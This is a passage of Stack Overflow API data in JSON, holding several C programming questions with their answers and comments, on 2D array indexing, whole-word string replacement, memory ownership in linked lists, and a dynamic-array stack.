"https://www.gravatar.com/avatar/a29ae5ecb74bea23afa60d940edc0282?s=128&d=identicon&r=PG&f=1", "display_name": "Cherubim", "link": "https://stackoverflow.com/users/5281962/cherubim"}, "reply_to_user": {"reputation": 81, "user_id": 5442643, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/297e2eaaa08461343ea526c6764d1f85?s=128&d=identicon&r=PG&f=1", "display_name": "Batool", "link": "https://stackoverflow.com/users/5442643/batool"}, "edited": false, "score": 0, "creation_date": 1449711905, "post_id": 34184607, "comment_id": 56130982, "body": "@Batool I know you&#39;ve typed in wrong question but I think this answers your question.. So please mark it as answer for future users as it would be helpful for them"}], "tags": [], "owner": {"reputation": 4232, "user_id": 5281962, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a29ae5ecb74bea23afa60d940edc0282?s=128&d=identicon&r=PG&f=1", "display_name": "Cherubim", "link": "https://stackoverflow.com/users/5281962/cherubim"}, "is_accepted": true, "score": 2, "last_activity_date": 1449681725, "last_edit_date": 1449681725, "creation_date": 1449680373, "answer_id": 34184607, "question_id": 34184212, "link": "https://stackoverflow.com/questions/34184212/how-to-read-2d-arrays-in-c/34184607#34184607", "title": "How to read 2D arrays in C?", "body": "<p>The <strong>output</strong> you get is absolutely right for this loop. </p>\n\n<pre><code>  for (i=0;i&lt;4;i++)\n{\n    many[i] = arr[i][i] + arr[i][i];\n    printf(\"%d\\n\", many[i]);\n}\n</code></pre>\n\n<p>You can easily get to know it by <strong>tracing</strong>.</p>\n\n<hr>\n\n<p><strong>so let's trace it...</strong></p>\n\n<p><strong>during i=0</strong> </p>\n\n<p><code>arr[0][0]</code> denotes <em>1st element</em> <strong><em>(as indices start from 0)</em></strong> of <em>1st array</em> which is <strong>1</strong></p>\n\n<pre><code>many[0] = arr[0][0]+arr[0][0] // 1+1=2\n</code></pre>\n\n<p><strong>during i=1</strong></p>\n\n<p>arr[1][1] denotes <em>2nd element</em> of <em>2nd array</em> which is also <strong>1</strong></p>\n\n<pre><code>many[0] = arr[1][1]+arr[1][1] // 1+1=2\n</code></pre>\n\n<p><strong>during i=2</strong> </p>\n\n<p>arr[2][2] denotes <em>3rd element</em> of <em>3rd array</em> which is <strong>4</strong></p>\n\n<pre><code>many[2] = arr[2][2]+arr[2][2] // 4+4=8\n</code></pre>\n\n<p><strong>during i=3</strong> </p>\n\n<p>arr[3][3] denotes <em>4th element</em> of <em>4th array</em> which is <strong>3</strong></p>\n\n<pre><code>many[3] = arr[3][3]+arr[3][3] // 3+3=6\n</code></pre>\n\n<hr>\n\n<p>Therefore,The output of this program is:</p>\n\n<pre><code>2\n2\n8\n6\n</code></pre>\n\n<blockquote>\n  <p>Note: arr[m][n] denotes (n+1)th element of (m+1)th array</p>\n</blockquote>\n"}], "owner": {"reputation": 81, "user_id": 5442643, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/297e2eaaa08461343ea526c6764d1f85?s=128&d=identicon&r=PG&f=1", "display_name": "Batool", "link": "https://stackoverflow.com/users/5442643/batool"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 90, "favorite_count": 0, "accepted_answer_id": 34184607, "answer_count": 2, "score": 0, "last_activity_date": 1449681754, "creation_date": 1449679351, "last_edit_date": 1449681532, "question_id": 34184212, "link": "https://stackoverflow.com/questions/34184212/how-to-read-2d-arrays-in-c", "title": "How to read 2D arrays in C?", "body": "<p>I'm learning about 2D arrays in C and I'm a bit confused. I have the following program which reads a 2D arrays and adds its values in another array.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint main() {        \n    int arr[4][5] = {{1,2,3,4,5},\n                     {3,1,1,5,2},\n                     {4,1,4,1,5},\n                     {2,5,3,3,4}};\n    int many[4];\n    int i;\n\n    for (i=0;i&lt;4;i++) {\n        many[i] = arr[i][i] + arr[i][i];\n        printf(\"%d\\n\", many[i]);\n    }\n</code></pre>\n\n<p>The output of this program is: </p>\n\n<pre><code>2\n2\n8\n6\n</code></pre>\n\n<p>But I think it should be <code>3, 3, 9, 7</code> because the for loop starts at 1 and the first column and row gets 1 and second column and row get 2 because there is already 1 which means 1+1 = 2 and 2 + 1 = 3, for second number it is same idea.\nFor the third number I got 9 because we get 4 from row 2 column 2. 4 + 4 + 1 = 9 and for last number I got 7 because last row has 3 in row 3 column 3.</p>\n"}, {"tags": ["c", "string", "replace"], "comments": [{"owner": {"reputation": 97942, "user_id": 25324, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c812d568dcbf02b96796728be3cac626?s=128&d=identicon&r=PG", "display_name": "pmg", "link": "https://stackoverflow.com/users/25324/pmg"}, "edited": false, "score": 2, "creation_date": 1449679204, "post_id": 34184127, "comment_id": 56114619, "body": "Check whether the characters right before and right after the string are letters. Make sure to not check before the 1st char though."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1449679506, "post_id": 34184127, "comment_id": 56114825, "body": "You are making wild assumptions about buffer sizes.  What guarantee do you have that the resulting string will be at most <code>LMAX-1</code> bytes long and will fit in the source buffer pointed to by <code>sir</code>?"}, {"owner": {"reputation": 13, "user_id": 5646715, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bb1add4d9f777259a12b8baeb87e8ab5?s=128&d=identicon&r=PG&f=1", "display_name": "Crouze", "link": "https://stackoverflow.com/users/5646715/crouze"}, "edited": false, "score": 0, "creation_date": 1449679684, "post_id": 34184127, "comment_id": 56114966, "body": "I&#39;m gonna realloc right after I get the function to work properly"}, {"owner": {"reputation": 15906, "user_id": 3527940, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/k1R45.jpg?s=128&g=1", "display_name": "jcaron", "link": "https://stackoverflow.com/users/3527940/jcaron"}, "edited": false, "score": 0, "creation_date": 1449681736, "post_id": 34184127, "comment_id": 56116358, "body": "You need to tell us how you wish to define a &quot;word&quot;. Is that something surrounded by spaces? By non-letters? Are digits parts of words, or do they separate them? Likewise for _..."}], "answers": [{"comments": [{"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 1, "creation_date": 1449689212, "post_id": 34184990, "comment_id": 56120906, "body": "The <code>char</code> argument to <code>isspace</code> must be converted to <code>unsigned char</code>:  <code>isspace((unsigned char)p[l1])</code>.  Otherwise negative <code>char</code> values invoke undefined behavior."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 1, "creation_date": 1449689260, "post_id": 34184990, "comment_id": 56120940, "body": "You can simplify the word boundary test from 6 comparisons down to just 4 comparisons: <code>if ((p == sir || isspace((unsigned char)p[-1])) &amp;&amp; (isspace((unsigned char)p[l1]) || p[l1] == &#39;\\0&#39;))</code>.  The current implementation fails to match the searched word if it is alone on the line."}, {"owner": {"reputation": 106438, "user_id": 1275169, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c6dbda4e65af6d2ceaabdfad538b319?s=128&d=identicon&r=PG&f=1", "display_name": "P.P", "link": "https://stackoverflow.com/users/1275169/p-p"}, "reply_to_user": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1449689826, "post_id": 34184990, "comment_id": 56121272, "body": "@chqrlie I often forget <i>that</i> cast :) Thanks for the suggestion. I have included it the answer."}], "tags": [], "owner": {"reputation": 106438, "user_id": 1275169, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c6dbda4e65af6d2ceaabdfad538b319?s=128&d=identicon&r=PG&f=1", "display_name": "P.P", "link": "https://stackoverflow.com/users/1275169/p-p"}, "is_accepted": false, "score": 2, "last_activity_date": 1449689821, "last_edit_date": 1449689821, "creation_date": 1449681460, "answer_id": 34184990, "question_id": 34184127, "link": "https://stackoverflow.com/questions/34184127/replacing-every-occurrence-of-a-word-in-c/34184990#34184990", "title": "Replacing every occurrence of a word in C", "body": "<p>You need to check if there's a whitespace before and after the word you are going to replace. With special conditions:  </p>\n\n<ul>\n<li>For first word, previous word doesn't exist.  </li>\n<li>For last word, next word doesn't exist.</li>\n</ul>\n\n<p>I have added the logic for this in your code:</p>\n\n<pre><code>void replace(char *sir, char *word1, char *word2)\n{\n    char *buffer;\n    buffer = calloc( 100, sizeof(char) );\n    char *insert_point = &amp;buffer[0];\n    char *tmp = sir;\n    int l1 = strlen( word1 );\n    int l2 = strlen( word2 );\n    while(1)\n    {\n            char *p = strstr( tmp, word1 );\n            if( p == NULL )\n            {\n                    strcpy( insert_point, tmp );\n                    break;\n            }\n            memcpy( insert_point, tmp, p-tmp );\n            insert_point += p-tmp;\n\n            if ( (p == sir || isspace((unsigned char)p[-1])) &amp;&amp; \n                 (isspace((unsigned char)p[l1]) || p[l1] == 0) ) {\n                   memcpy( insert_point, word2, l2 );\n                   insert_point += l2;\n                }\n                else { \n                   memcpy(insert_point, word1, l1);\n                   insert_point += l1;\n                }\n                tmp = p+l1;\n        }\n        strcpy( sir, buffer );\n        free( buffer );\n    }\n</code></pre>\n"}], "owner": {"reputation": 13, "user_id": 5646715, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bb1add4d9f777259a12b8baeb87e8ab5?s=128&d=identicon&r=PG&f=1", "display_name": "Crouze", "link": "https://stackoverflow.com/users/5646715/crouze"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 129, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1449689821, "creation_date": 1449679064, "last_edit_date": 1449679625, "question_id": 34184127, "link": "https://stackoverflow.com/questions/34184127/replacing-every-occurrence-of-a-word-in-c", "title": "Replacing every occurrence of a word in C", "body": "<p>So, I have to replace every occurrence of a word in a larger string and I have a function to do so which looks like this:</p>\n\n<pre><code>void replace(char *sir, char *word1, char *word2) {\n    char *buffer;\n    buffer = calloc(LMAX, sizeof(char));\n    char *insert_point = &amp;buffer[0];\n    char *tmp = sir;\n    int l1 = strlen(word1);\n    int l2 = strlen(word2);\n    while (1) {\n        char *p = strstr(tmp, word1);\n        if (p == NULL) {\n            strcpy( insert_point, tmp );\n            break;\n        }\n        memcpy(insert_point, tmp, p - tmp);\n        insert_point += p - tmp;\n        memcpy(insert_point, word2, l2);\n        insert_point += l2;\n        tmp = p + l1;\n    }\n    strcpy(sir, buffer);\n    free(buffer);\n}\n</code></pre>\n\n<p>Which works, but it replaces substrings as well, not only the words. By example, if I have: \"This is my string ing\" and I want to replace 'ing' with 'watermelon' I'll get something like this: \"This is my strwatermelon watermelon\".\nSo, my question would be how can I make my program to check if what's he's replacing is a word or not?</p>\n"}, {"tags": ["c", "memory-management", "linked-list"], "comments": [{"owner": {"reputation": 353, "user_id": 5596737, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/528a7f0bde619a3a9ac18fbcc1e4a505?s=128&d=identicon&r=PG&f=1", "display_name": "Abel Duarte", "link": "https://stackoverflow.com/users/5596737/abel-duarte"}, "edited": false, "score": 0, "creation_date": 1449679238, "post_id": 34183990, "comment_id": 56114637, "body": "It seems wasteful if you don&#39;t have a reference to the value added to the list anymore to first find it in the list, get a reference and then delete the value."}, {"owner": {"reputation": 381, "user_id": 1462283, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/432dc2e4ef6d5364c04dad4468080926?s=128&d=identicon&r=PG", "display_name": "prkist", "link": "https://stackoverflow.com/users/1462283/prkist"}, "edited": false, "score": 1, "creation_date": 1449679266, "post_id": 34183990, "comment_id": 56114662, "body": "Why not just free() it as well since it&#39;s your own implementation of a list?"}], "answers": [{"comments": [{"owner": {"reputation": 2414, "user_id": 5339529, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/4ecd2b15539f40fea4bbb59864ad9fc0?s=128&d=identicon&r=PG&f=1", "display_name": "ForeverStudent", "link": "https://stackoverflow.com/users/5339529/foreverstudent"}, "edited": false, "score": 1, "creation_date": 1449679315, "post_id": 34184180, "comment_id": 56114686, "body": "I have a generic list implementation on github.com/danfromiran you can look at it if you like"}, {"owner": {"reputation": 353, "user_id": 5596737, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/528a7f0bde619a3a9ac18fbcc1e4a505?s=128&d=identicon&r=PG&f=1", "display_name": "Abel Duarte", "link": "https://stackoverflow.com/users/5596737/abel-duarte"}, "edited": false, "score": 0, "creation_date": 1449679673, "post_id": 34184180, "comment_id": 56114954, "body": "I like your answer the best, very good idea to return a pointer to the data that needs to be freed. My original concern was having to force the user of the linked list to retrieve the item first then free it after popping. Your implementation solves this by returning a pointer to what needs to be freed therefore removing this additional lookup."}, {"owner": {"reputation": 2414, "user_id": 5339529, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/4ecd2b15539f40fea4bbb59864ad9fc0?s=128&d=identicon&r=PG&f=1", "display_name": "ForeverStudent", "link": "https://stackoverflow.com/users/5339529/foreverstudent"}, "reply_to_user": {"reputation": 353, "user_id": 5596737, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/528a7f0bde619a3a9ac18fbcc1e4a505?s=128&d=identicon&r=PG&f=1", "display_name": "Abel Duarte", "link": "https://stackoverflow.com/users/5596737/abel-duarte"}, "edited": false, "score": 0, "creation_date": 1449679978, "post_id": 34184180, "comment_id": 56115160, "body": "these are all design decisions, usually if the user pops a node THEN they are responsible for freeing that ONE node. the whole point of list_delete(myList) is to remove the requirement from user to pop and delete every item individually."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1449777102, "post_id": 34184180, "comment_id": 56165082, "body": "and just what does C know about <code>containers</code>?  Nothing.  Perhaps you meant C++."}, {"owner": {"reputation": 2414, "user_id": 5339529, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/4ecd2b15539f40fea4bbb59864ad9fc0?s=128&d=identicon&r=PG&f=1", "display_name": "ForeverStudent", "link": "https://stackoverflow.com/users/5339529/foreverstudent"}, "reply_to_user": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1449783320, "post_id": 34184180, "comment_id": 56168628, "body": "@user3629249, No, I was talking about C. Your are correct that C does not know anything about C++ containers that are provided by the C++ standard library (std::list, std::vector, etc), but it sure knows about what you tell it to know about: user defined structs to act as resource handles. The provided answer explores a logical approach a programmer can take while defining and implementing such a struct. this is by no way the only way to accomplish this task."}], "tags": [], "owner": {"reputation": 2414, "user_id": 5339529, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/4ecd2b15539f40fea4bbb59864ad9fc0?s=128&d=identicon&r=PG&f=1", "display_name": "ForeverStudent", "link": "https://stackoverflow.com/users/5339529/foreverstudent"}, "is_accepted": false, "score": 4, "last_activity_date": 1449679650, "last_edit_date": 1449679650, "creation_date": 1449679265, "answer_id": 34184180, "question_id": 34183990, "link": "https://stackoverflow.com/questions/34183990/when-implementing-a-linked-list-in-c-who-is-responsible-for-freeing-the-value/34184180#34184180", "title": "When implementing a linked list in C who is responsible for freeing the value?", "body": "<p>that is a very common way of container implementation in C.\nbasically you dynamically allocate the contents of the list and pass the pointer to the container, now the container is responsible for freeing it. </p>\n\n<p>You can also pass in a function pointer to <code>list_create()</code> so it knows how to do <code>list_remove_last()</code> properly, this is especially useful for using a generic container that does not know what type of elements it will contain (it will just hold void * pointers).\nthink of the case where the data itself is a struct that contains other pointers. in this case list_remove() can not do a simple free() on its data field, instead it should use the function pointer that was passed in to free the data.</p>\n\n<p>your approach has a small problem: </p>\n\n<p>if you have list* as the return type of list_create(), then you will have to do a free(list) in your main function. alternatively, you can have list_create() return a list, as opposed to a list*, this is a logical choice because a list has its bulk of information dynamically allocated and accessible through a pointer anyway. </p>\n\n<p>in the second case you would need  a function list_destroy(list) that would destroy any element your list holds.</p>\n"}, {"comments": [{"owner": {"reputation": 2414, "user_id": 5339529, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/4ecd2b15539f40fea4bbb59864ad9fc0?s=128&d=identicon&r=PG&f=1", "display_name": "ForeverStudent", "link": "https://stackoverflow.com/users/5339529/foreverstudent"}, "edited": false, "score": 0, "creation_date": 1449679858, "post_id": 34184224, "comment_id": 56115067, "body": "this is stylistically very elegant but will suffer a performance hit when the data in the container are large. for a short string list_add(myList, &quot;my string literal&quot; ) is not a big issue, but imagine instead of this string literal you have a very large data structure. The unnecessary copy would severely hinder performance"}, {"owner": {"reputation": 39990, "user_id": 5528593, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/7JPcT.png?s=128&g=1", "display_name": "Ren&#233; Vogt", "link": "https://stackoverflow.com/users/5528593/ren%c3%a9-vogt"}, "reply_to_user": {"reputation": 2414, "user_id": 5339529, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/4ecd2b15539f40fea4bbb59864ad9fc0?s=128&d=identicon&r=PG&f=1", "display_name": "ForeverStudent", "link": "https://stackoverflow.com/users/5339529/foreverstudent"}, "edited": false, "score": 0, "creation_date": 1449680472, "post_id": 34184224, "comment_id": 56115485, "body": "Because of that the accepted answer convinced me too and I up voted it. It&#39;s callback mechanism enables the list user to take care of memory himself without the burden of finding the item in the list. Though this requires that the user knows what kind of value he stored. If he mixes integers with pointers to structs containing more pointers it will be difficult to know what to free in the callback function."}, {"owner": {"reputation": 2414, "user_id": 5339529, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/4ecd2b15539f40fea4bbb59864ad9fc0?s=128&d=identicon&r=PG&f=1", "display_name": "ForeverStudent", "link": "https://stackoverflow.com/users/5339529/foreverstudent"}, "edited": false, "score": 0, "creation_date": 1449684178, "post_id": 34184224, "comment_id": 56117919, "body": "thanks man. generally a user should be careful when appending items to a list. appending different size and different type objects to a generic list is almost never a good idea."}], "tags": [], "owner": {"reputation": 39990, "user_id": 5528593, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/7JPcT.png?s=128&g=1", "display_name": "Ren&#233; Vogt", "link": "https://stackoverflow.com/users/5528593/ren%c3%a9-vogt"}, "is_accepted": false, "score": 3, "last_activity_date": 1449679379, "creation_date": 1449679379, "answer_id": 34184224, "question_id": 34183990, "link": "https://stackoverflow.com/questions/34183990/when-implementing-a-linked-list-in-c-who-is-responsible-for-freeing-the-value/34184224#34184224", "title": "When implementing a linked list in C who is responsible for freeing the value?", "body": "<p>My guide line is: the one who allocates memory is also responsible for de-allocating it. </p>\n\n<p>If you implement a linked list that allocates the memory for the values, the implementation should also take care of freeing this memory when the entries are removed from the list. For strings this could be done by copying the strings to a newly allocated buffer of adequate size. </p>\n\n<p>If your implementation of a linked list only stores plain values (e.g. pointers) without allocating extra memory for the values, it should also avoid freeing memory it did not allocate, because it doesn't know what the allocator planned for this memory in the future. </p>\n"}, {"tags": [], "owner": {"reputation": 381, "user_id": 1462283, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/432dc2e4ef6d5364c04dad4468080926?s=128&d=identicon&r=PG", "display_name": "prkist", "link": "https://stackoverflow.com/users/1462283/prkist"}, "is_accepted": false, "score": 2, "last_activity_date": 1449679644, "creation_date": 1449679644, "answer_id": 34184328, "question_id": 34183990, "link": "https://stackoverflow.com/questions/34183990/when-implementing-a-linked-list-in-c-who-is-responsible-for-freeing-the-value/34184328#34184328", "title": "When implementing a linked list in C who is responsible for freeing the value?", "body": "<p>The proper way would be to have <code>list_remove_node()</code> a function that would free not only the list (node) itself, but also the value that was allocated for that specific node. Also, you shouldn't need to search for a specific node according to your text as you should be able to just call <code>free(node-&gt;text)</code> (which can be done even in the current <code>list_remove_last()</code> function)</p>\n\n<p>The main C logic is that you are supposed to free() anything that you allocated yourself. Certain libraries will allocate memory for their own work, which most often you are supposed to clean up as well (as you were the one who asked for it).</p>\n"}, {"tags": [], "owner": {"reputation": 119716, "user_id": 643383, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/uQ5JF.png?s=128&g=1", "display_name": "Caleb", "link": "https://stackoverflow.com/users/643383/caleb"}, "is_accepted": true, "score": 3, "last_activity_date": 1449679935, "creation_date": 1449679935, "answer_id": 34184456, "question_id": 34183990, "link": "https://stackoverflow.com/questions/34183990/when-implementing-a-linked-list-in-c-who-is-responsible-for-freeing-the-value/34184456#34184456", "title": "When implementing a linked list in C who is responsible for freeing the value?", "body": "<blockquote>\n  <p>C does not implement any specific scheme for memory management other than just giving you the ability to allocate and free memory by passing a pointer</p>\n</blockquote>\n\n<p>Yes, C lacks any kind of automatic memory management, so you have to be careful to deallocate any memory blocks that you instantiate.</p>\n\n<blockquote>\n  <p>Whose responsibility should it be to release the memory taken up by the value when deleted from the list? The linked list's or the normal flow of the program?</p>\n</blockquote>\n\n<p><strong>It's your responsibility.</strong> You can do it however you like. You can write a general purpose linked list where the caller has to be responsible for allocating and deallocating space for each value in the list because the list management functions don't know how much space each value might require, or whether the values might be needed beyond the lifetime of the node. Or, you can write a list implementation that manages every aspect of the node, including space for the value stored in the node. In some cases, a list node <em>includes</em> the value in the node definition, like:</p>\n\n<pre><code>struct Node {\n    struct Node *next;\n    int value;\n};\n</code></pre>\n\n<p>and other times the node has a pointer to some other block that has the actual value:</p>\n\n<pre><code>struct Node {\n    struct Node *next;\n    void *value;\n};\n</code></pre>\n\n<p>Another approach is to define a structure with just the part needed for the list operation (i.e. the <code>next</code> pointer), and then piggyback data onto that structure:</p>\n\n<pre><code>struct Node {\n    struct Node *next;\n};\n\nstruct MyNode {\n    struct Node node;\n    int price;\n    int quantity;\n};\n</code></pre>\n\n<p>So, there are lots of ways to do it, and none of them are wrong. You should choose the style that makes sense for your needs. Do you have big, complex values that you don't want to duplicate, that you want to store in a linked list, but which you want to continue to use even after they're removed from the list? Go with the first style above. Do you want to manage everything related to the linked list in one place? Then go with the second style.</p>\n\n<p>The point is: C dictates a lot less than other languages do, and while that means that you have to think harder about program correctness, you also get the freedom to do things very directly and in a style of your choosing. Embrace that. </p>\n"}], "owner": {"reputation": 353, "user_id": 5596737, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/528a7f0bde619a3a9ac18fbcc1e4a505?s=128&d=identicon&r=PG&f=1", "display_name": "Abel Duarte", "link": "https://stackoverflow.com/users/5596737/abel-duarte"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 580, "favorite_count": 2, "accepted_answer_id": 34184456, "answer_count": 4, "score": 8, "last_activity_date": 1449679935, "creation_date": 1449678626, "question_id": 34183990, "link": "https://stackoverflow.com/questions/34183990/when-implementing-a-linked-list-in-c-who-is-responsible-for-freeing-the-value", "title": "When implementing a linked list in C who is responsible for freeing the value?", "body": "<p>I am implementing a linked list in C and I am running into the issue where C does not implement any specific scheme for memory management other than just giving you the ability to allocate and free memory by passing a pointer. There is no concept of whether the value might be needed later on in the program.</p>\n\n<p>The typical implementation I find online for a linked list basically deallocs the deleted node but does not dealloc the node's value. </p>\n\n<p>Whose responsibility should it be to release the memory taken up by the value when deleted from the list ? The linked list's or the normal flow of the program ?</p>\n\n<p>example:</p>\n\n<pre><code>// allocate 10 bytes\nchar *text = malloc(sizeof(char) * 10);\n\n// create the linked list\nLinkedList *list = list_create();\n\n// add the text pointer to the linked list\nlist_append(list, text);\n// remove the pointer from the linked list\nlist_remove_last(list);\n</code></pre>\n\n<p>In this case text would end up not getting deallocated as list_remove_last just frees the memory that the new node takes up. What would be the proper way to release the memory taken up by text ?</p>\n"}, {"tags": ["c", "arrays", "dynamic", "stack"], "comments": [{"owner": {"reputation": 56828, "user_id": 4062354, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/xcV4d.png?s=128&g=1", "display_name": "MikeCAT", "link": "https://stackoverflow.com/users/4062354/mikecat"}, "edited": false, "score": 0, "creation_date": 1449678195, "post_id": 34183641, "comment_id": 56113810, "body": "Note: they say <a href=\"http://stackoverflow.com/questions/605845/do-i-cast-the-result-of-malloc\">you shouldn&#39;t case the result of <code>malloc()</code> in C</a>."}, {"owner": {"reputation": 56828, "user_id": 4062354, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/xcV4d.png?s=128&g=1", "display_name": "MikeCAT", "link": "https://stackoverflow.com/users/4062354/mikecat"}, "edited": false, "score": 1, "creation_date": 1449678247, "post_id": 34183641, "comment_id": 56113856, "body": "<code>printf(&quot;Array doubling happened successfully!\\n&quot;);</code> without checking if the <code>realloc()</code> was successful? Nonsense."}, {"owner": {"reputation": 303, "user_id": 4464074, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cc08210da3ca4ac006b61c07cc5dfbe3?s=128&d=identicon&r=PG&f=1", "display_name": "Rajan Kalra", "link": "https://stackoverflow.com/users/4464074/rajan-kalra"}, "reply_to_user": {"reputation": 56828, "user_id": 4062354, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/xcV4d.png?s=128&g=1", "display_name": "MikeCAT", "link": "https://stackoverflow.com/users/4062354/mikecat"}, "edited": false, "score": 0, "creation_date": 1449679521, "post_id": 34183641, "comment_id": 56114833, "body": "That was not meant to check the successful allocation of memory but to tell the no of times the array doubling was happening! I appreciate the help but watch the lingo!"}], "answers": [{"comments": [{"owner": {"reputation": 303, "user_id": 4464074, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cc08210da3ca4ac006b61c07cc5dfbe3?s=128&d=identicon&r=PG&f=1", "display_name": "Rajan Kalra", "link": "https://stackoverflow.com/users/4464074/rajan-kalra"}, "edited": false, "score": 0, "creation_date": 1449679165, "post_id": 34183932, "comment_id": 56114579, "body": "Thanks for the swift reply, its working. I have a question why was it producing error for the second error doubling and not in the first time itself?"}], "tags": [], "owner": {"reputation": 56828, "user_id": 4062354, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/xcV4d.png?s=128&g=1", "display_name": "MikeCAT", "link": "https://stackoverflow.com/users/4062354/mikecat"}, "is_accepted": false, "score": 2, "last_activity_date": 1449678474, "creation_date": 1449678474, "answer_id": 34183932, "question_id": 34183641, "link": "https://stackoverflow.com/questions/34183641/implementing-stack-using-dynamic-array/34183932#34183932", "title": "Implementing Stack using Dynamic Array", "body": "<p>You failed to multiply the size to allocate via <code>realloc()</code> by <code>sizeof(int)</code>.</p>\n\n<p>Try this with some other improvement:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct Stack {\n    int *arr;\n    int top,size,capacity;\n};\n\nstruct Stack *createStack(int capacity) {\n    struct Stack *s = malloc(sizeof(struct Stack));\n    s-&gt;arr = malloc(sizeof(int)*capacity);\n    s-&gt;top = -1;\n    s-&gt;capacity = capacity;\n    s-&gt;size = 0;\n    return s;\n}\n\nvoid destroyStack(struct Stack *s) {\n    if(s != NULL) free(s-&gt;arr);\n    free(s);\n}\n\nvoid doubleStack(struct Stack *s) {\n    s-&gt;capacity = s-&gt;capacity*2;\n    s-&gt;arr = realloc(s-&gt;arr,sizeof(int)*s-&gt;capacity);\n    if(s-&gt;arr != NULL) {\n        printf(\"Array doubling happened successfully!\\n\");\n    } else {\n        perror(\"realloc\");\n    }\n}\n\nint isFull(struct Stack *s) {\n    return s-&gt;size == s-&gt;capacity;\n}\n\nvoid push(struct Stack *s, int item) {\n    if(isFull(s))\n        doubleStack(s);\n\n    printf(\"%d pushed!\\n\",item);\n    s-&gt;arr[++(s-&gt;top)] = item;\n    s-&gt;size++;\n}\n\nint isEmpty(struct Stack *s) {\n    return s-&gt;size == 0;\n}\n\nvoid pop(struct Stack *s) {\n    if(isEmpty(s)) {\n        printf(\"Empty stack!\\n\");\n        return;\n    }\n\n    int item = s-&gt;arr[(s-&gt;top)--];\n    s-&gt;size--;\n    printf(\"%d popped!\\n\",item);\n}\n\nint main(void) {\n    struct Stack *s = createStack(2);\n    push(s,1);\n    push(s,2);\n    push(s,3);\n    push(s,4);\n    push(s,5);\n    pop(s);\n    pop(s);\n    destroyStack(s);\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 303, "user_id": 4464074, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cc08210da3ca4ac006b61c07cc5dfbe3?s=128&d=identicon&r=PG&f=1", "display_name": "Rajan Kalra", "link": "https://stackoverflow.com/users/4464074/rajan-kalra"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3152, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1449678474, "creation_date": 1449677659, "question_id": 34183641, "link": 